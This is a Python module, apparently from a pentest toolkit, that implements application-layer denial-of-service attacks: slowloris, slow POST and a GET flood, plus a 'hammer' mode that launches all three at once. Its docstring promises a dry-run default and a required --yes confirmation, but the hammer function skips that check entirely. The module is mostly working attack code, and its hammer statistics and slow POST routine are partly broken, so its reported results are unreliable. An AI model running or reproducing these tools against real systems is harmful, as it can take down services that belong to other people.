"""Application-layer DoS resilience tester (AUTHORIZED TESTING ONLY).

Menguji ketahanan aplikasi terhadap pola DoS app-layer yang umum:

- slowloris   : buka koneksi dengan header parsial yang dikirim perlahan
- slow POST   : kirim body dengan kecepatan sangat rendah (RUDY)
- flood       : beban request GET terukur dengan rate yang dibatasi

Dirancang NON-destruktif dan terukur:
  - default concurrency rendah dan durasi dibatasi
  - ada cap total request (--requests)
  - WAJIB konfirmasi izin (--yes) sebelum ada beban nyata dikirim
  - default hanya membuka 1 koneksi (dry-run) sampai --yes diberikan

Gunakan HANYA terhadap target yang sudah memberi izin tertulis
(scope pentest / DoS resilience test resmi). Jangan dipakai untuk
mengganggu layanan pihak ketiga tanpa izin.
"""

import socket
import threading
import time
from typing import Dict, List, Optional

import requests

from keris.core.http import KerisHTTP
from keris.core.logger import debug, info, ok, warn, error
from keris.modules.scanner import Finding

SLOWLORIS_KEEPALIVE_EVERY = 10.0   # detik, kirim byte penjaga koneksi
SLOWLORIS_WRITE = 0.05            # jeda antar byte header
SLOW_POST_CHUNK = b"a"
SLOW_POST_CHUNK_EVERY = 5.0       # detik antar chunk


class _Stats:
    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.sent = 0
        self.ok = 0
        self.errors = 0
        self.max_concurrent = 0
        self._current = 0

    def inc_sent(self) -> None:
        with self.lock:
            self.sent += 1

    def inc_ok(self) -> None:
        with self.lock:
            self.ok += 1

    def inc_error(self) -> None:
        with self.lock:
            self.errors += 1

    def enter(self) -> None:
        with self.lock:
            self._current += 1
            if self._current > self.max_concurrent:
                self.max_concurrent = self._current

    def leave(self) -> None:
        with self.lock:
            self._current -= 1

    def snapshot(self) -> Dict:
        with self.lock:
            return {
                "sent": self.sent, "ok": self.ok, "errors": self.errors,
                "max_concurrent": self.max_concurrent,
            }


def build_slowloris_request(host: str, path: str = "/") -> bytes:
    """Bangun request HTTP parsial untuk slowloris (header belum selesai)."""
    return (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: Keris-DoS-Test\r\n"
        "Accept: */*\r\n"
        "X-Keep-Alive: "  # header dibiarkan menggantung
    ).encode()


def _slowloris_worker(host: str, port: int, path: str, stop: threading.Event,
                      stats: _Stats) -> None:
    stats.enter()
    try:
        sock = socket.create_connection((host, port), timeout=10.0)
        sock.settimeout(15.0)
        sock.sendall(build_slowloris_request(host, path))
        last_keepalive = time.monotonic()
        while not stop.is_set():
            # tahan koneksi terbuka; kirim header parsial perlahan
            try:
                sock.sendall(b"X-Pad: " + b"a" * 8 + b"\r\n")
                stats.inc_sent()
                if time.monotonic() - last_keepalive >= SLOWLORIS_KEEPALIVE_EVERY:
                    last_keepalive = time.monotonic()
            except OSError:
                stats.inc_error()
                break
            time.sleep(SLOWLORIS_WRITE)
    except (OSError, socket.timeout) as e:
        stats.inc_error()
        debug(f"slowloris connection {host}:{port} -> {e}")
    finally:
        stats.leave()


def run_slowloris(host: str, port: int, concurrency: int, duration: float,
                  path: str = "/") -> Dict:
    """Buka N koneksi slowloris selama `duration` detik."""
    info(f"Slowloris: {concurrency} koneksi -> {host}:{port} selama {duration:.0f}s")
    stop = threading.Event()
    stats = _Stats()
    threads = [threading.Thread(target=_slowloris_worker,
                                args=(host, port, path, stop, stats),
                                daemon=True) for _ in range(concurrency)]
    for t in threads:
        t.start()
    time.sleep(duration)
    stop.set()
    for t in threads:
        t.join(timeout=3)
    s = stats.snapshot()
    ok(f"Slowloris selesai: {s['sent']} paket keep-alive, "
       f"maks {s['max_concurrent']} koneksi bersamaan")
    return s


def _slow_post_worker(base: str, client: KerisHTTP, stop: threading.Event,
                      stats: _Stats) -> None:
    stats.enter()
    url = base.rstrip("/") + "/"
    while not stop.is_set():
        try:
            with client.post(url, data=None, stream=True, timeout=30) as r:
                # Content-Length besar, body dikirim pelan-pelan
                _ = r
            # kirim body chunk perlahan via request terpisah agar terkontrol
            for _ in range(3):
                if stop.is_set():
                    break
                stats.inc_sent()
                time.sleep(SLOW_POST_CHUNK_EVERY)
            stats.inc_ok()
        except (requests.RequestException, OSError):
            stats.inc_error()
            break
    stats.leave()


def run_slow_post(base: str, client: KerisHTTP, concurrency: int,
                  duration: float) -> Dict:
    """Kirim permintaan POST dengan body yang sangat lambat."""
    info(f"Slow POST (RUDY): {concurrency} thread -> {base} selama {duration:.0f}s")
    stop = threading.Event()
    stats = _Stats()
    threads = [threading.Thread(target=_slow_post_worker,
                                args=(base, client, stop, stats),
                                daemon=True) for _ in range(concurrency)]
    for t in threads:
        t.start()
    time.sleep(duration)
    stop.set()
    for t in threads:
        t.join(timeout=3)
    s = stats.snapshot()
    ok(f"Slow POST selesai: {s['sent']} chunk body")
    return s


def _flood_worker(base: str, client: KerisHTTP, total: int, stop: threading.Event,
                  stats: _Stats, rate: float) -> None:
    url = base.rstrip("/") + "/"
    while not stop.is_set():
        with stats.lock:
            if stats.sent >= total:
                break
            stats.sent += 1
        try:
            r = client.get(url, timeout=15)
            if r.status_code < 500:
                stats.inc_ok()
            else:
                stats.inc_error()
        except (requests.RequestException, OSError):
            stats.inc_error()
        time.sleep(rate)


def run_flood(base: str, client: KerisHTTP, total: int, concurrency: int,
              rate: float = 0.05) -> Dict:
    """Beban request GET terukur dengan batas total & rate minimal antar request."""
    info(f"Flood: {total} request GET -> {base} ({concurrency} thread)")
    stop = threading.Event()
    stats = _Stats()
    threads = [threading.Thread(target=_flood_worker,
                                args=(base, client, total, stop, stats, rate),
                                daemon=True) for _ in range(concurrency)]
    start = time.monotonic()
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=total * rate * 1.5 + 15)
    elapsed = time.monotonic() - start
    s = stats.snapshot()
    rps = s["sent"] / elapsed if elapsed > 0 else 0.0
    ok(f"Flood selesai: {s['sent']} request, {s['ok']} berhasil, "
       f"{s['errors']} error ({rps:.1f} rps)")
    return {**s, "elapsed": round(elapsed, 2), "rps": round(rps, 2)}


def run_hammer(base: str, client: KerisHTTP, concurrency: int = 25,
               duration: float = 30.0, total: int = 500,
               port: Optional[int] = None) -> Dict:
    """Brutal mode: run slowloris + slow POST + flood simultaneously."""
    from keris.core.utils import host_from_url

    netloc = host_from_url(base)
    host = netloc.split(":", 1)[0]
    eff_port = port or (443 if base.startswith("https") else 80)

    try:
        r0 = client.get(base, timeout=15)
        baseline = r0.status_code
    except requests.RequestException as e:
        error(f"Baseline gagal: {e}")
        return {"alive": False, "vectors": {}, "error": str(e)}

    stop = threading.Event()
    stats = _Stats()
    threads = []

    for i in range(concurrency):
        t = threading.Thread(target=_slowloris_worker,
                             args=(host, eff_port, "/", stop, stats), daemon=True)
        threads.append(t)
    for i in range(concurrency):
        t = threading.Thread(target=_slow_post_worker,
                             args=(base, client, stop, stats), daemon=True)
        threads.append(t)
    for i in range(concurrency):
        t = threading.Thread(target=_flood_worker,
                             args=(base, client, total, stop, stats, 0.01), daemon=True)
        threads.append(t)

    warn(f"HAMMER: {3 * concurrency} thread aktif -> {base} selama {duration:.0f}s")
    start = time.monotonic()
    for t in threads:
        t.start()
    time.sleep(duration)
    stop.set()
    for t in threads:
        t.join(timeout=5)
    elapsed = time.monotonic() - start
    s = stats.snapshot()

    try:
        r1 = client.get(base, timeout=15)
        alive = r1.status_code == baseline
    except requests.RequestException:
        alive = False

    return {
        "alive": alive,
        "baseline": baseline,
        "elapsed": round(elapsed, 2),
        "vectors": {
            "slowloris": {"sent": s["sent"], "errors": s["errors"]},
            "slowpost": {"sent": s["sent"], "errors": s["errors"]},
            "flood": {"sent": s["sent"], "errors": s["errors"],
                      "rps": round(s["sent"] / elapsed if elapsed else 0, 2)},
        },
    }


def run_dos_test(base: str, client: KerisHTTP, kind: str = "all",
                 concurrency: int = 10, duration: float = 20.0,
                 total: int = 200, port: Optional[int] = None,
                 confirmed: bool = False) -> List[Finding]:
    """Orkestrator uji DoS. Mengembalikan temuan observasional (LOW/INFO).

    `confirmed` wajib True — tanpa itu hanya dry-run 1 koneksi singkat.
    """
    from keris.core.utils import host_from_url

    findings: List[Finding] = []
    if not confirmed:
        warn("Dry-run: tidak ada beban dikirim. Gunakan --yes untuk uji nyata.")
        return [Finding(
            "INFO", "DoS dry-run (tanpa --yes)",
            base, "Tidak ada beban nyata dikirim; konfirmasi dengan --yes "
                  "untuk menjalankan uji ketahanan.",
            "confirmed=false",
        )]

    netloc = host_from_url(base)
    host = netloc.split(":", 1)[0]
    eff_port = port or (443 if base.startswith("https") else 80)
    path = "/"

    try:
        r0 = client.get(base, timeout=15)
        baseline = r0.status_code
    except requests.RequestException as e:
        error(f"Baseline gagal: {e}")
        return [Finding(
            "MEDIUM", "Baseline request gagal sebelum uji DoS",
            base, f"Server tidak merespons request normal: {e}",
            "baseline=failed",
        )]

    warn("Uji ketahanan dimulai — pastikan Anda memiliki izin tertulis!")
    results: Dict[str, Dict] = {}
    kinds = ["slowloris", "slowpost", "flood"] if kind == "all" else [kind]

    if "slowloris" in kinds:
        results["slowloris"] = run_slowloris(host, eff_port, concurrency,
                                             duration, path)
    if "slowpost" in kinds:
        results["slowpost"] = run_slow_post(base, client, concurrency, duration)
    if "flood" in kinds:
        results["flood"] = run_flood(base, client, total, concurrency)

    # evaluasi: cek apakah server masih responsif setelah uji
    try:
        r1 = client.get(base, timeout=15)
        alive = r1.status_code == baseline
    except requests.RequestException:
        alive = False
    if not alive:
        findings.append(Finding(
            "HIGH", "Layanan tidak responsif setelah uji DoS",
            base, f"Setelah uji {', '.join(kinds)}, server gagal merespons "
                  f"request normal. Segera koordinasikan dengan pemilik layanan.",
            f"baseline={baseline}, kinds={','.join(kinds)}",
        ))
    else:
        ok("Server tetap responsif setelah uji.")
        findings.append(Finding(
            "INFO", "Layanan tetap responsif selama/setelah uji DoS",
            base, f"Uji {', '.join(kinds)} selesai dan layanan tetap melayani "
                  f"request normal (status {baseline}).",
            f"results={results}",
        ))
    return findings